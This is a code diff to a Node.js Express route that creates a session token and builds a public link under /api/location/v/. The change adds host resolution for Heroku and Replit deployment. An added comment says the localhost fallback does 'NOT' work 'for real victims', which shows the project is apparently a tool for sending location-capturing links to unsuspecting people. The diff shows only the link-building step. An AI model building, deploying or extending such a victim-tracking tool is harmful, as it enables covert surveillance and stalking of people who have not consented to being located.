@@ -30,10 +30,17 @@ router.post('/start', (req, res) => {
         timestamp  : Date.now()
     };
 
-    // Build the public link — prefer REPLIT_DEV_DOMAIN, fall back to HOST env, then localhost
-    const host = process.env.REPLIT_DEV_DOMAIN
-        ? `https://${process.env.REPLIT_DEV_DOMAIN}`
-        : (process.env.HOST_URL || `http://localhost:${process.env.PORT || 3001}`);
+    // Build the public link — check env vars in priority order:
+    //   APP_URL                        → set this in Heroku config vars (recommended)
+    //   REPLIT_DEV_DOMAIN              → Replit environment
+    //   HEROKU_APP_DEFAULT_DOMAIN_NAME → auto-set by Heroku (if labs feature enabled)
+    //   HOST_URL                       → any custom host
+    //   localhost fallback             → works locally only, NOT for real victims
+    const host = (process.env.APP_URL || '').replace(/\/$/, '')
+        || (process.env.REPLIT_DEV_DOMAIN ? `https://${process.env.REPLIT_DEV_DOMAIN}` : '')
+        || (process.env.HEROKU_APP_DEFAULT_DOMAIN_NAME ? `https://${process.env.HEROKU_APP_DEFAULT_DOMAIN_NAME}` : '')
+        || (process.env.HOST_URL || '').replace(/\/$/, '')
+        || `http://localhost:${process.env.PORT || 3001}`;
 
     const link = `${host}/api/location/v/${sessionToken}`;
     res.json({ sessionToken, link });
